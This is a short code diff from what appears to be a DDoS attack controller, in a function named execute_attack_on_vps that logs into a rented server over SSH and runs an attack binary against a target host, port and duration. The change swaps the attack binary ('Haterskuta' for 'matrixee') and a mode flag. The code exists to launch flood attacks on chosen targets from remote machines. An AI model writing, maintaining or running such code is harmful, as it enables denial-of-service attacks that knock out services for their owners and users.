@@ -866,7 +866,7 @@ def execute_attack_on_vps(vps, target, port, time):
             auth_timeout=20
         )
 
-        command = f"./Haterskuta {target} {port} {time} 2"
+        command = f"./matrixee {target} {port} {time} 1"
         channel = ssh.get_transport().open_session()
         channel.exec_command(command)
         
